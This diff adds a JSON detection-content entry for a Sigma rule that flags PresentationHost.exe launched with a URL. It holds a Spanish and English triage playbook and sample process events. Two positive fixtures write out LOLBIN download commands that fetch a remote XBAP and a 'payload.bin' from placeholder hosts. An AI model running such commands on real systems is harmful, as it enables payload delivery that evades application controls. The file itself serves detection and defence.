@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "b124ddf4-778d-418e-907f-6dd3fc0d31cd",
+    "title": "Arbitrary File Download Via PresentationHost.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_presentationhost_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_presentationhost_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó PresentationHost.exe con una URL (http, https o ftp) en la línea de comandos. Esto puede indicar que se está abusando del binario firmado de WPF para descargar un archivo o un XBAP remoto.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\presentationhost.exe u OriginalFileName es PresentationHost.exe, y CommandLine contiene http://, https:// o ftp://.",
+      "why_it_matters": "PresentationHost es un LOLBIN firmado por Microsoft. Un atacante puede usarlo para descargar un payload o ejecutar XBAP remotos desde un binario confiable y evadir controles de aplicaciones (ATT&CK T1218, ejecución mediante binarios del sistema como proxy).",
+      "triage_steps": [
+        "Revise CommandLine y extraiga la URL completa. Valide el dominio o la IP contra inteligencia de amenazas y la reputación del proxy.",
+        "Analice ParentImage y la línea de comandos del proceso padre. Es sospechoso que Office, un intérprete de scripts, mshta o un navegador lancen PresentationHost directamente.",
+        "Verifique que Image esté en System32 o SysWOW64 y que la firma sea válida. Una copia renombrada solo se reconoce por OriginalFileName.",
+        "Busque archivos que PresentationHost haya escrito en el mismo host en +/- 15 minutos, sobre todo en INetCache, Temp o el perfil del usuario. Obtenga su hash.",
+        "Consulte los logs de proxy, DNS y firewall para ver conexiones del host al dominio de la URL. Anote el tamaño y el tipo de contenido de la respuesta.",
+        "Revise los procesos hijos y la actividad de red posterior de PresentationHost o del archivo descargado.",
+        "Busque alertas previas del mismo host y usuario, y la misma URL en otros endpoints."
+      ],
+      "false_positives": [
+        "Aplicaciones WPF de navegador (.xbap) heredadas, alojadas en servidores web de la intranet y abiertas por usuarios.",
+        "Desarrolladores o QA que prueban despliegues XBAP o WPF contra servidores web de prueba."
+      ],
+      "response_steps": [
+        "Confirme si la URL pertenece a una aplicación XBAP interna conocida y aprobada. Si es así, documéntelo y ajuste la regla.",
+        "Si es maliciosa, aísle el endpoint y bloquee el dominio o la IP en el proxy y el DNS.",
+        "Recolecte y ponga en cuarentena los archivos descargados. Tras analizarlos, elimine la persistencia que hayan creado.",
+        "Restablezca las credenciales del usuario si se confirma la ejecución de código, y busque la misma URL en toda la organización.",
+        "Donde no se use XBAP, restrinja PresentationHost.exe con WDAC o AppLocker."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque el uso legítimo de XBAP con URL es raro pero existe, y la alerta muestra una capacidad de descarga o ejecución, no un compromiso confirmado."
+    },
+    "en": {
+      "summary": "PresentationHost.exe was launched with a URL (http, https or ftp) on its command line. This can mean the signed WPF host binary is being abused to download a remote file or XBAP.",
+      "what_it_detects": "Process creation events where Image ends with \\presentationhost.exe or OriginalFileName is PresentationHost.exe, and CommandLine contains http://, https:// or ftp://.",
+      "why_it_matters": "PresentationHost is a Microsoft-signed LOLBIN. Attackers can use it to fetch payloads or run remote XBAP applications under a trusted binary and slip past application controls (ATT&CK T1218, System Binary Proxy Execution).",
+      "triage_steps": [
+        "Read CommandLine and extract the full URL. Check the domain or IP against threat intel and your proxy reputation data.",
+        "Review ParentImage and the parent command line. Office apps, script hosts, mshta or a browser launching PresentationHost directly is suspicious.",
+        "Confirm Image is in System32 or SysWOW64 and that the signature is valid. A renamed copy shows only in OriginalFileName.",
+        "Look for files PresentationHost wrote on the same host within +/- 15 minutes, especially in INetCache, Temp or the user profile. Hash them.",
+        "Pivot on proxy, DNS and firewall logs for connections from the host to the URL's domain. Note the response size and content type.",
+        "Check child processes and later network activity from PresentationHost or from the downloaded file.",
+        "Look for earlier alerts on the same host and user, and for the same URL on other endpoints."
+      ],
+      "false_positives": [
+        "Legacy internal WPF browser applications (.xbap) hosted on intranet web servers and opened by users.",
+        "Developers or QA testing XBAP or WPF deployments against test web servers."
+      ],
+      "response_steps": [
+        "Confirm whether the URL belongs to a known, approved internal XBAP application. If it does, document it and tune the rule.",
+        "If malicious, isolate the endpoint and block the domain or IP at the proxy and DNS.",
+        "Collect and quarantine the downloaded files, then remove any persistence they created after analysis.",
+        "Reset the user's credentials if code execution is confirmed, and hunt for the same URL fleet-wide.",
+        "Where XBAP is not needed, restrict PresentationHost.exe with WDAC or AppLocker."
+      ],
+      "severity_rationale": "Medium fits because legitimate XBAP use with URLs is rare but still exists, and the alert shows a download or execution primitive, not confirmed compromise."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PresentationHost launched by Word with an HTTPS URL to a remote XBAP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\PresentationHost.exe",
+          "OriginalFileName": "PresentationHost.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\PresentationHost.exe\" https://203.0.113.45/app/update.xbap",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jperez\\Downloads\\factura.docm\""
+        }
+      },
+      {
+        "description": "Renamed copy of PresentationHost identified by OriginalFileName, downloading over HTTP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\ph.exe",
+          "OriginalFileName": "PresentationHost.exe",
+          "CommandLine": "ph.exe http://files.example.org/payload.bin",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "PresentationHost started by the system with the -embedding switch and no URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\PresentationHost.exe",
+          "OriginalFileName": "PresentationHost.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\PresentationHost.exe\" -embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "Browser opening an HTTPS URL; the image is not PresentationHost",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+          "OriginalFileName": "msedge.exe",
+          "CommandLine": "\"msedge.exe\" https://intranet.example.com/portal",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
